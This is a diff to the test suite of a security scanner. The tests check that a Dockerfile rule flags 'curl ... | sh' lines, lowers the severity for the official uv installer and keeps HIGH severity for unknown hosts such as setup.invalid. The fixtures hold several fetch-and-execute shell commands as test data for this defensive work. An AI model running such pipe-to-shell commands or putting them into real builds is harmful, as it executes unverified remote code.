@@ -6470,7 +6470,7 @@ class TestAPinCountsForItsOwnCommand:
             "FROM debian:12\n"
             "ARG NODE_MAJOR=22\n"
             'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n'
-            "RUN curl -fsSL https://sh.rustup.rs | sh -s -- -y\n"
+            "RUN curl -fsSL https://get.tool.invalid/install.sh | sh -s -- -y\n"
         )
         hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
         assert [f for f in hits if f.severity >= Severity.HIGH]
@@ -13668,3 +13668,28 @@ class TestAnOfficialInstallerIsSetup:
     def test_any_other_host_keeps_its_weight(self, tmp_path) -> None:
         found = self._dropper(tmp_path, "https://astral-sh.invalid/uv/install.sh")
         assert any(f.severity >= Severity.HIGH for f in found)
+
+
+class TestAnOfficialInstallerInADockerfile:
+    @staticmethod
+    def _severity(tmp_path, line: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "Dockerfile").write_text(f"FROM python:3.12\nRUN {line}\n", encoding="utf-8")
+        found = [
+            f
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"
+        ]
+        return max((f.severity for f in found), default=None)
+
+    def test_the_uv_installer_is_stepped_down(self, tmp_path) -> None:
+        severity = self._severity(tmp_path, "curl -LsSf https://astral.sh/uv/install.sh | sh")
+        assert severity is not None and severity < Severity.HIGH
+
+    def test_an_unknown_host_is_not(self, tmp_path) -> None:
+        severity = self._severity(tmp_path, "curl -LsSf https://setup.invalid/install.sh | sh")
+        assert severity is Severity.HIGH
